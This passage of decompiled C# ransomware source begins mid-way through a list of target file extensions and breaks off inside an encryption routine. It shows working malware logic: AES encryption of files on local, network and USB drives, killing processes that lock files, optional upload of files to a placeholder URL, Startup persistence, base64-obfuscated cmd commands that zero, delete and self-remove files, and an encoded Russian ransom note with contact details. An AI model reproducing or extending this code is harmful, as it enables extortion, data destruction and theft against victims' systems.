					"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
					"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
					"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
					"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
					"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
					"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
					"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
					"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
					"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
					"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
					"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
					"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
					"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
					"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
					"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
					"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
					"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
					"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
					"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
					"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
					"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
					"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
					"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
					"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
					"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
					"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
					"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
					"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
					"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
					"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
					"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
					"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
					"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
					"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
					"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
					"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
					"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
					"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
					"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
					"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
					"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
					"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
					"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
					"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
					"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
					"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
					"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
					"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
					"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
					"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
					"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
					"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
					"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
					"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
					"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
					"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
					"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
					"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
					"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
					"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
					"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
					"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
					"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
					"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
					"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
					"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
					"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
					"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
					"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
					"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
					"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
					"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
					"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
					"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
					"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
					"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
					"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
					"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
					"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
					"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
					"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
					"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
					"AVHD", "AVHDX", "OVA", "BKF"
				}, ".mxf1bd", new string[0], DynamicPass);
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = false;
			thread.Start();
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string lpLocalPath, int dwInfoLevel, IntPtr lpBuffer, ref int lpBufferSize);

	private static string LocalToUNC(string localPath, int maxLen = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(maxLen);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(localPath, 1, intPtr, ref maxLen) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void CleanMyStuff()
	{
		ProcessCommand("cmd.exe", Base64Decode("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = Base64Decode("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void RemoveReadOnlyAttribute(string filePath)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(filePath);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(filePath, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(filePath);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(filePath, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, "File: " + filePath + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string getOSInfo()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string LeaveRegards(string mykey)
	{
		string text = Path.GetTempPath() + "\\Инструкция.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(Base64Decode("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyZTgyMkBtc2dzYWZlLmlvDQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCiAt0KfQtdC8INCx0YvRgdGC0YDQtdC1INCy0Ysg0YHQvtC+0LHRidC40YLQtSDQvdCw0Lwg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAsINGC0LXQvCDQsdGL0YHRgtGA0LXQtSDQvNGLINCy0YvQutC70Y7Rh9C40Lwg0L/RgNC+0LjQt9Cy0L7Qu9GM0L3QvtC1INGD0LTQsNC70LXQvdC40LUg0YTQsNC50LvQvtCyLg0KIC3QndCw0L/QuNGB0LDQsiDQvdCw0Lwg0L3QsCDQv9C+0YfRgtGDINCy0Ysg0L/QvtC70YPRh9C40YLQtSDQtNCw0LvRjNC90LXQudGI0LjQtSDQuNC90YHRgtGA0YPQutGG0LjQuCDQv9C+INC+0L/Qu9Cw0YLQtS4NCg0K0JIg0L7RgtCy0LXRgtC90L7QvCDQv9C40YHRjNC80LUg0JLRiyDQv9C+0LvRg9GH0LjRgtC1INC/0YDQvtCz0YDQsNC80LzRgyDQtNC70Y8g0YDQsNGB0YjQuNGE0YDQvtCy0LrQuC4NCtCf0L7RgdC70LUg0LfQsNC/0YPRgdC60LAg0L/RgNC+0LPRgNCw0LzQvNGLLdC00LXRiNC40YTRgNC+0LLRidC40LrQsCDQstGB0LUg0JLQsNGI0Lgg0YTQsNC50LvRiyDQsdGD0LTRg9GCINCy0L7RgdGB0YLQsNC90L7QstC70LXQvdGLLg0KDQrQnNGLINCz0LDRgNCw0L3RgtC40YDRg9C10Lw6DQoxMDAlINGD0YHQv9C10YjQvdC+0LUg0LLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQstGB0LXRhSDQstCw0YjQuNGFINGE0LDQudC70L7Qsg0KMTAwJSDQs9Cw0YDQsNC90YLQuNGOINGB0L7QvtGC0LLQtdGC0YHRgtCy0LjRjw0KMTAwJSDQsdC10LfQvtC/0LDRgdC90YvQuSDQuCDQvdCw0LTQtdC20L3Ri9C5INGB0LXRgNCy0LjRgQ0K0JLQvdC40LzQsNC90LjQtSENCiAqINCd0LUg0L/Ri9GC0LDQudGC0LXRgdGMINGD0LTQsNC70LjRgtGMINC/0YDQvtCz0YDQsNC80LzRgyDQuNC70Lgg0LfQsNC/0YPRgdC60LDRgtGMINCw0L3RgtC40LLQuNGA0YPRgdC90YvQtSDRgdGA0LXQtNGB0YLQstCwDQogKiDQn9C+0L/Ri9GC0LrQuCDRgdCw0LzQvtGB0YLQvtGP0YLQtdC70YzQvdC+0Lkg0YDQsNGB0YjQuNGE0YDQvtCy0LrQuCDRhNCw0LnQu9C+0LIg0L/RgNC40LLQtdC00YPRgiDQuiDQv9C+0YLQtdGA0LUg0JLQsNGI0LjRhSDQtNCw0L3QvdGL0YUNCiAqINCU0LXRiNC40YTRgNCw0YLQvtGA0Ysg0LTRgNGD0LPQuNGFINC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC5INC90LXRgdC+0LLQvNC10YHRgtC40LzRiyDRgSDQktCw0YjQuNC80Lgg0LTQsNC90L3Ri9C80LgsINGC0LDQuiDQutCw0Log0YMg0LrQsNC20LTQvtCz0L4g0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GPDQrRg9C90LjQutCw0LvRjNC90YvQuSDQutC70Y7RhyDRiNC40YTRgNC+0LLQsNC90LjRjw0KDQoNCtCa0LDQttC00YvQtSAyNCDRh9Cw0YHQsCDRg9C00LDQu9GP0Y7RgtGB0Y8gMjQg0YTQsNC50LvQsCwg0L3QtdC+0LHRhdC+0LTQuNC80L4g0L/RgNC40YHQu9Cw0YLRjCDRgdCy0L7QuSDQuNC00LXQvdGC0LjRhNC40LrQsNGC0L7RgCDRh9GC0L7QsSDQvNGLINC+0YLQutC70Y7Rh9C40LvQuCDRjdGC0YMg0YTRg9C90LrRhtC40Y4uDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YHRgtC+0LjQvNC+0YHRgtGMINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFINGD0LLQtdC70LjRh9C40LLQsNC10YLRgdGPINC90LAgMzAlICjRh9C10YDQtdC3IDcyINGH0LDRgdCwINGB0YPQvNC80LAg0YTQuNC60YHQuNGA0YPQtdGC0YHRjykNCg0KDQpQLlMNCtCV0YHQu9C4INCS0LDQvCDQvdC1INC+0YLQstC10YLQuNC70Lgg0LIg0YLQtdGH0LXQvdC40LggNDgg0YfQsNGB0L7Qsi4g0JLQsNC8INC90YPQttC90L4g0LHRg9C00LXRgiDRgdCy0Y/Qt9Cw0YLRjNGB0Y8g0YEg0L3QsNC80Lgg0L/QviDQtNC+0L/QvtC70L3QuNGC0LXQu9GM0L3Ri9C8INC60L7QvdGC0LDQutGC0LDQvC4gDQoNCtCh0LrQsNGH0LDQudGC0LUg0Lgg0YPRgdGC0LDQvdC+0LLQuNGC0LUgVG9yIEJyb3dzZXIgLSBodHRwczovL3d3dy50b3Jwcm9qZWN0Lm9yZy9ydS9kb3dubG9hZC8NCtCe0YLQutGA0L7QudGC0LUg0YfQtdGA0LXQtyBUb3IgQnJvd3NlciDRgdCw0LnRgiAtIGh0dHA6Ly9zb25hcm1zbmc1dnp3cWV6bHZ0dTJpaXd3ZG4zZHhraG90ZnRpa2hvd3BmanV6ZzdwM2NhNWVpZC5vbmlvbiAo0YHQsNC50YIg0L3QtSDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0YfQtdGA0LXQtyDQvtCx0YvRh9C90YvQuSDQsdGA0LDRg9C30LXRgCwg0YLQvtC70YzQutC+INGH0LXRgNC10Lcg0KLQntCgKQ0K0JfQsNGA0LXQs9C40YHRgtGA0LjRgNGD0LnRgtC10YHRjCDQuCDQvdCw0L/QuNGI0LjRgtC1INC90LDQvC4gDQoNCirQndCw0Ygg0L3QuNC6INCyIFNvbmFyJ2UgLSBzYXZlZmlsZTM2NQ=="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(Base64Decode("S0VZSUQ6IA=="));
				streamWriter.WriteLine(mykey);
				if (UniqueHWID)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(Base64Decode("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(UtilMe.UniqID());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(mykey) && !Unique)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + mykey);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	public static void appShortcutToSartUp(string linkName, string appName)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + linkName + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + appName);
		streamWriter.WriteLine("IconIndex=0");
		string text = appName.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void Crypt(string[] dizin, string[] uzantilar, string[] excomunicated, string sifre, string crypt_uzantisi)
	{
		if (Impersonation && !getOSInfo().Contains("XP") && !getOSInfo().Contains("Windows 7"))
		{
			TokenImpersonation.ImpExp();
		}
		PasswordBytes = Convert.FromBase64String(sifre);
		DriveInfo[] array = null;
		if (dizin[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = LocalToUNC(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !DizonList.Contains(text))
							{
								DizonList.Add(text);
							}
							else if (!DizonList.Contains(array[i].Name))
							{
								DizonList.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!DizonList.Contains(array[i].Name))
							{
								DizonList.Add(array[i].Name);
							}
						}
					}
					else if (!DizonList.Contains(array[i].Name))
					{
						DizonList.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < dizin.Length; i++)
			{
				if (!DizonList.Contains(dizin[i]))
				{
					DizonList.Add(dizin[i]);
				}
			}
		}
		if (DizonList.Contains(Base64Decode("Qzpc")) && SkipC == "YES")
		{
			DizonList.Remove(Base64Decode("Qzpc"));
		}
		if (CatchDrv == "YES")
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				LiveDrive.StartUSBService();
			});
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		Parallel.ForEach(DizonList, delegate(string t)
		{
			if (AccessToken && !getOSInfo().Contains("XP") && !getOSInfo().Contains("Windows 7"))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						SetAccess(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (MultipleThreads == "YES")
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
			}
		});
	}

	public static void WorkerCrypter(string targetDir, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (AlternateAlgo == "NO")
		{
			if (ntfsmft == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && IsDriveNTFS(targetDir))
			{
				Enumerator enumerator = null;
				try
				{
					enumerator = new Enumerator(targetDir.Replace("\\", ""));
				}
				catch
				{
					list = TraverseTree(targetDir, extensions, extension, excluded, DynamicPass);
					return;
				}
				try
				{
					WorkerCrypter2(enumerator.ToArray().ToList(), extensions, extension, excluded, DynamicPass);
					return;
				}
				catch (Exception)
				{
					list = TraverseTree(targetDir, extensions, extension, excluded, DynamicPass);
					return;
				}
			}
			list = TraverseTree(targetDir, extensions, extension, excluded, DynamicPass);
			return;
		}
		list = RecursiveFileSearch.SearchFiles(targetDir);
		foreach (string text in extensions)
		{
			foreach (string item in list)
			{
				if (excluded.Length != 0)
				{
					int num = 0;
					while (num < excluded.Length)
					{
						string value = excluded[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03ca;
					}
				}
				if ((ProcessAll == "NO" && !item.EndsWith(text)) || EncryptedFiles.Contains(item))
				{
					continue;
				}
				if (ReleaseLockedFiles == "YES")
				{
					try
					{
						if (LockedFiles.Islocked(item))
						{
							LockedFiles.Killproc(item);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(item);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(item)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (PartialEncrytion == "YES" && fileStream.Length > Convert.ToInt32(PartialSize) * 1024 * 1024 && !list3.Contains(text))
					{
						if (Styler == "YES")
						{
							foreach (string item2 in extstyl)
							{
								if (item.ToLower().EndsWith(item2) && LimitMe == "YES")
								{
									if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											UtilMe.SendB("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LimitMe == "NO")
								{
									try
									{
										UtilMe.SendB("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] clear = Encryptions.ReadFromFile(item, Convert.ToInt32(PartialSize) * 1024 * 1024);
						byte[] encrypted = Encryptions.AESEncryptBytes(clear, Convert.FromBase64String(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						Encryptions.WriteToFile(item, encrypted);
						if (extension != ".*")
						{
							File.Move(item, item + extension);
						}
					}
					else if (extension != ".*")
					{
						Encrypt(item, item + extension, PasswordBytes);
					}
					else
					{
						Encrypt(item, item + ".part", PasswordBytes);
					}
				}
				catch (Exception)
				{
				}
				IL_03ca:;
			}
		}
	}

	public static void WorkerCrypter2(List<string> files, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		List<string> domeall = new List<string> { "" };
		if (ProcessAll == "NO")
		{
			string partfileInfo;
			Parallel.ForEach(extensions, delegate(string t1)
			{
				foreach (string file in files)
				{
					if (((!file.Contains("C:\\Program Files\\") && !file.Contains("C:\\Program Files (x86)\\") && !file.Contains(":\\Windows\\") && !file.ToLower().Contains("perflogs") && !file.ToLower().Contains("internet explorer") && !file.Contains(":\\ProgramData\\") && !file.Contains("\\AppData\\") && !file.ToLower().Contains("msocache") && !file.ToLower().Contains("system volume information") && !file.ToLower().Contains("boot") && !file.ToLower().Contains("tor browser") && !file.ToLower().Contains("mozilla") && !file.ToLower().Contains("google chrome") && !file.ToLower().Contains("application data")) || file.Contains(Base64Decode("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))) && !file.Contains("autoexec.bat") && !file.Contains("desktop.ini") && !file.Contains("autorun.inf") && !file.Contains("ntuser.dat") && !file.Contains("NTUSER.DAT") && !file.Contains("iconcache.db") && !file.Contains("bootsect.bak") && !file.Contains("boot.ini") && !file.Contains("ntuser.dat.log") && !file.Contains("thumbs.db") && !file.ToLower().Contains("bootmgr") && !file.ToLower().Contains("pagefile.sys") && !file.ToLower().Contains("config.sys") && !file.ToLower().Contains("ntuser.ini") && !file.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !file.Contains("RSAKeys") && !file.Contains("Config.enc") && !file.Contains("Инструкция") && !file.EndsWith(extension) && !file.EndsWith("exe") && !file.EndsWith("dll") && !file.EndsWith("EXE") && !file.EndsWith("DLL") && !file.Contains("Recycle.Bin") && !file.Contains(MyStartName) && !file.Contains(DebugReport) && !file.Contains(LocalReportFileName))
					{
						if (excluded.Length != 0)
						{
							string[] array3 = excluded;
							int num2 = 0;
							while (num2 < array3.Length)
							{
								string value2 = array3[num2];
								if (!file.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0b7d;
							}
						}
						try
						{
							if (file.EndsWith(extension))
							{
								goto IL_0b7d;
							}
						}
						catch (Exception)
						{
							goto IL_0b7d;
						}
						if (file.EndsWith(t1) && !EncryptedFiles.Contains(file))
						{
							if (ReleaseLockedFiles == "YES")
							{
								try
								{
									if (LockedFiles.Islocked(file))
									{
										LockedFiles.Killproc(file);
									}
								}
								catch
								{
								}
							}
							EncryptedFiles.Add(file);
							if (!EncryptedDirs.Contains(Path.GetDirectoryName(file)))
							{
								EncryptedDirs.Add(Path.GetDirectoryName(file));
							}
							RemoveReadOnlyAttribute(file);
							try
							{
								new FileUnblocker().Unblock(file);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(file, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (ConsoleReport)
										{
											Console.WriteLine("Setting write access permission: " + file + " - File Size: " + new FileInfo(file).Length + " bytes");
											Console.WriteLine("----------------------------------------------------------------------------");
										}
									}
									catch
									{
									}
